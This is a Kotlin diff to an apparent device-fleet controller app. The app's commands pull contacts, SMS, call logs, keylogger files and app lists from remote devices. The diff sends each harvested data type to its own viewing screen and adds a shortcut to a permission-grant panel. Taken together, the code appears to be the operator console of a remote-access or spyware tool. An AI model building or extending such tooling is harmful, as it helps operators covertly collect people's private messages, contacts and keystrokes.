@@ -64,6 +64,14 @@ private val DATA_COMMANDS = setOf(
     "contacts", "calllog", "sms", "keylog_file", "keylog_list", "perms", "apps"
 )
 
+private val DATA_ROUTES = mapOf(
+    "contacts" to "contacts",
+    "sms" to "sms",
+    "calllog" to "calllog",
+    // perms opens the Access panel: the grant table plus the native grant flow.
+    "perms" to "access",
+)
+
 private data class ActionData(
     val label: String,
     val icon: ImageVector,
@@ -79,6 +87,7 @@ fun FleetScreen(
     onModules: () -> Unit,
     onTerminal: () -> Unit,
     onData: () -> Unit,
+    onCapability: (String) -> Unit = { onData() },
 ) {
     val scope = rememberCoroutineScope()
     val rpc = remember(config) { RpcClient(config) }
@@ -150,7 +159,14 @@ fun FleetScreen(
             inFlight = inFlight - command
             when (outcome) {
                 is CommandOutcome.Ok -> {
-                    if (command in DATA_COMMANDS) {
+                    val route = DATA_ROUTES[command]
+                    if (route != null) {
+                        // Each capability has its own screen with affordances that
+                        // match the data shape (threads, call types, grant states).
+                        ResultHolder.title = label
+                        ResultHolder.text = outcome.output
+                        onCapability(route)
+                    } else if (command in DATA_COMMANDS) {
                         // A contact list or SMS dump in a one-line log card is
                         // unreadable; hand it to the data screen instead.
                         ResultHolder.title = label
@@ -378,6 +394,10 @@ fun FleetScreen(
         Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
             WideButton("Files", Icons.Default.Folder, AccentAmber, Modifier.weight(1f)) { onFileManager() }
             WideButton("Modules", Icons.Default.Extension, AccentPurple, Modifier.weight(1f)) { onModules() }
+            // Direct entry to the grant panel; "Check Granted" also lands there.
+            WideButton("Access", Icons.Default.Lock, AccentGreen, Modifier.weight(1f)) {
+                onCapability("access")
+            }
         }
 
         // ---- activity feed ---------------------------------------------------
